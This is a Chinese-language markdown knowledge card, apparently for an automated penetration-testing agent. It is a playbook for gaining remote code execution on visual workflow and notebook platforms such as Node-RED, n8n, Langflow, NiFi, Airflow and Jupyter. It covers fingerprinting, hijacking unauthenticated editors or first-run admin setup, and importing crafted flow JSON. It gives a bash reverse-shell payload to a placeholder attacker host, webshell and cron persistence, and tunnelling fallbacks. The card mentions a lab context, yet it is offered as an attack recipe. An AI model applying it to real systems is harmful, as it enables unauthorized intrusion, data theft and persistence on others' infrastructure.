---
name: 'orchestration-platform-rce'
description: '可视化编排/低代码/Notebook 平台 RCE 原语：能进编辑器 + 有 exec/code 节点 = RCE。覆盖 Node-RED/n8n/Flowise/Langflow/Dify/NiFi/Airflow/Jupyter。含判断信号、决策树、各产品细节锚（检索词：node-red/low-code/workflow/exec/n8n/langflow/nifi/jupyter/notebook/node red/low code/orchestration/platform）'
whenToUse: '遇到非标端口的 Web 服务、返回 JSON 的 SPA 型 API、或疑似可视化流程/notebook 平台（1880/5678/7860/3000/8080/8888）时；拿到编辑器 UI 后判断能否直接执行代码。'
metadata: { domain: web, tier: T2 }
---

# 可视化编排 / 低代码 / Notebook 平台 RCE 原语

> 写法说明：本卡**不绑定任何一台靶机**。主线是跨产品可迁移的原语；§3 是产品级细节锚（命令/端口/quirk），
> 用来落地执行。机器名不进卡 —— 换一台机器遇到同类产品，本卡仍然成立。

## 0. 这一类的共同结构（抽象层）

不看具体产品，这类目标共享同一组特征：

| 特征 | 为什么它是攻击面 |
|------|-----------------|
| Web UI + 内置「执行」节点 / cell | 设计目的就是执行代码或命令 → **功能即 RCE** |
| 默认无鉴权，或首次访问即可自设管理员 | 部署者当它内网工具，不设防 |
| 非标端口（不是 80/443） | 逃过资产清单与常规扫描 |
| UI 是 SPA、API 返回 JSON | 直接 GET 常报错，**但这不代表不可访问** |

🔴 **核心判断**：只要进得了编辑器，且平台有 exec/code/script 节点 → **就是 RCE，不用去找漏洞**。
这不是配置错误，是**按设计工作**。

## 1. 判断信号（命中即走 §2）

```
[ ] 端口非标：1880 / 5678 / 7860 / 3000 / 8080 / 8443 / 8888 / 8188 / 5000
[ ] GET / 返回错误页，但同时满足任一：
      - 页面有 favicon（favicon 是独立于 banner 的指纹源）
      - 换 POST 返回 JSON
      - / 报 401 但 /api /editor /flows /ui /settings 可达
[ ] 标题或 JS 里出现 flow / node / workflow / pipeline / dag / notebook / graph 字样
[ ] 有 Deploy / Run / Execute / Import 按钮，或支持 JSON 导入导出
```

## 2. 决策树

```
1. 指纹识别
   ├─ favicon → mmh3 hash 比对已知库 / 反向图搜
   ├─ GET 失败 → 换 POST、换 Content-Type、换路径（/editor /api /flows /ui）
   └─ 版本端点（/settings /api/version /about /version）
2. 鉴权判定
   ├─ 直接进编辑器 → 3
   ├─ 要登录 → default-credentials + 「首次访问可自设管理员」接管
   └─ UI 401 但 API 无鉴权 → 直接打 API
3. 执行原语（按性价比排序）
   ├─ 🔴 有 import / 导入 flow → 直接导入构造好的 JSON（最快，见下）
   ├─ 有 exec / command / process 节点 → 连边 → Deploy
   ├─ 有 code / function 节点 → 写 JS/Python → 沙箱逃逸或直接 system
   └─ 有文件读/写节点或插件 → 写 webroot 拿 webshell，或读凭据文件
4. 落地后 → living-off-the-land（这类容器常无常用工具）
```

🔴 **优先走「导入」而不是「手搓节点」**：这类平台都支持 flow/DAG 的 JSON 导入导出。
手搓 UI 依赖图形交互，难自动化、易错；**导入一份构造好的 JSON 一步到位**。先找 Import。

## 3. 细节锚（产品级）

### 3.1 Node-RED — 端口 1880
- **指纹**：favicon 是 Node-RED logo；`GET /` 返回错误，**改 POST `/` 会返回编辑器路径的 JSON** ← 它的 quirk
- **banner 会骗人**：nmap 只报 `Node.js Express framework`，完全不提 Node-RED → 别只信 banner
- **执行**：拖 `tcp in` → `exec` → `tcp out`（勾 **Reply to TCP**）→ Deploy
  - 三条连线依次对应 **stdin / stdout / stderr**
  - payload 例：`bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"`
- **免图形操作**：直接 POST `/flows` 导入 flow JSON
- 落地后容器内常无 `netstat` → 用 `ss -twurp`

### 3.2 n8n (5678) / Flowise (3000) / Dify / Langflow (7860)
- 均有 code / function / tool 节点或自定义代码入口
- **Langflow CVE-2026-33017**：CVSS 9.3，< 1.9.0，未认证 RCE，**公开后约 20 小时即在野**（攻击者无公开 PoC，仅凭公告+diff）
- **Langflow CVE-2026-33309**：CVSS 9.9，路径穿越文件名 POST `/api/v2/files/` 写任意文件 → RCE
- AI/agent 语义层与 MCP 供应链 → 见 `mcp-ai-agent-attacks`

### 3.3 Apache NiFi (8080/8443)
- `ExecuteScript` / `ExecuteProcess` processor → 直接执行
- 另有 JDBC URL 注入路径 → `h2-java-alias-rce`

### 3.4 Jupyter (8888) / Airflow (8080) / Superset (8088)
- **Jupyter**：有终端就是 shell；默认口令见 `default-credentials`
- **Airflow**：DAG 里写 Python → 调度即执行；token/secret 常明文在配置或 metadata DB
- **Superset**：SQL Lab + 数据库 URI → 读文件/SSRF

### 3.5 通用兜底：写文件落地
有「读/写文件」类节点或插件时，**优先写 webroot 拿 webshell** —— 比反弹 shell 稳，
因为这类容器出网常受限。

## 4. 常见坑

- ❌ **GET 报错就放弃** → SPA 后端常只认 POST 或特定路径（Node-RED 是典型）
- ❌ 只信 nmap banner → **favicon 才是真正的指纹源**
- ❌ 硬记端口表 → 端口会撞车（Dify 与 Grafana 都用 3000）→ **以行为特征判断，不以端口判断**
- ❌ 写死容器内 IP → Docker **每次重启随机分配** .2/.3/.4，必须每轮重新发现
- ⚠️ 容器内反弹 shell 常因出网限制失败 → 备选：写 webshell / 写 cron / DNS、ICMP 隧道
- ⚠️ 编辑器操作不可脚本化时 → 回到「导入 JSON」或直接打 API

## 5. 与相邻卡的分工

| 卡 | 分工 |
|---|---|
| `mcp-ai-agent-attacks` | AI/agent **语义层**（prompt injection、MCP、模型、agent 供应链） |
| **本卡** | 这类**平台自身的 Web/RCE 面**（编辑器、节点、导入、默认无鉴权） |
| `unknown-service-probe` | 端口完全未知时的三步探测（banner→协议指纹→CVE） |
| `living-off-the-land` | 落地后**无常用工具**环境的能力重建 |
| `default-credentials` | 各平台默认口令 |
